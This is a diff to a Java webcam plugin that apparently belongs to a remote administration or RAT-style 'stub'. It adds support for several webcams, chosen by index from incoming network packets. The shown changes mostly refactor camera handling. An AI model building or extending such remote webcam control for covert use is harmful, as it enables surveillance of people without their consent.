@@ -25,11 +25,11 @@ public class WebcamPlugin extends StubPlugin {
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
 	public static boolean enabled;
-	public static Webcam cam;
+	public static List<Webcam> cams;
 
 	static {
 		try {
-			cam = Webcam.getDefault();
+			cams = Webcam.getWebcams();
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
@@ -40,8 +40,12 @@ public class WebcamPlugin extends StubPlugin {
 	}
 
 	public void onDisconnect(Exception ex) {
-		if (cam != null && cam.isOpen()) {
-			cam.close();
+		if (cams != null) {
+			for (Webcam cam : cams) {
+				if (cam != null && cam.isOpen()) {
+					cam.close();
+				}
+			}
 		}
 	}
 
@@ -53,10 +57,13 @@ public class WebcamPlugin extends StubPlugin {
 	public void onPacket(byte header) throws Exception {
 		if (header == HEADER) {
 			enabled = dis.readBoolean();
+			int webcam = dis.readInt();
 
+			Webcam cam = cams.get(webcam);		
+			
 			if (enabled) {
-				dos.writeByte(header);
-
+				dos.writeByte(header);			
+				
 				try {
 					if (!cam.isOpen()) {
 						cam.open();
@@ -104,7 +111,6 @@ public class WebcamPlugin extends StubPlugin {
 				dos.writeByte(LIST_WEBCAM_HEADER);
 
 				dos.writeInt(webcams.size());
-				System.out.println(webcams.size());
 				
 				for (Webcam webcam : webcams) {
 					writeString(webcam.getName());
